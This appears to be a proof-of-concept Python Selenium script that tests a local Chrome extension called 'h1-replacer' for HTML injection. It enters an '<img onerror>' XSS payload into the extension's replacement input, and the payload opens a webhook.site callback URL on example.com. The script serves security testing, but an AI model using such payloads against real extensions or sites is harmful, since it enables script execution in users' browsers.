import time
from selenium.webdriver import ActionChains, Chrome, ChromeOptions, Keys
from selenium.webdriver.common.by import By
from os import path
import hashlib

from pyvirtualdisplay.display import Display
from selenium.webdriver import Chrome, ChromeOptions
from selenium.webdriver.chrome.service import Service

abs_path = path.abspath("h1-replacer")
print('here')
print(abs_path)
m = hashlib.sha256()
m.update(abs_path.encode("utf-8"))
ext_id = "".join([chr(int(i, base=16) + 97) for i in m.hexdigest()][:32])
mh = f"chrome-extension://{ext_id}/popup.html"
print(mh)

with Display() as disp:
    print(disp.is_alive())
    options = ChromeOptions()
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--no-sandbox")
    load_ext_arg = "load-extension="+abs_path
    options.add_argument(load_ext_arg)


    driver = Chrome(service=Service(), options=options)
    driver.get(mh)


    original = driver.current_window_handle

    driver.switch_to.new_window('tab')

    new = driver.current_window_handle

    driver.get('https://www.example.com')

    time.sleep(2)
    driver.get_screenshot_as_file("ss.png")

    driver.switch_to.window(original)

    a = driver.find_element(By.ID,'replacementInput')

    payload = '<img src=x onerror="window.open(`https://webhook.site/f42caef6-9cbf-4473-93ca-3938c227d8d5`)">'

    a.send_keys(payload)

    driver.get_screenshot_as_file("ss.png")

    b = driver.find_element(By.ID, 'replaceButton')

    time.sleep(2)

    driver.get_screenshot_as_file("ss.png")

    b.click()
    
    driver.switch_to.window(new)
    time.sleep(1)
    driver.get_screenshot_as_file("ss.png")


    print(driver.page_source)
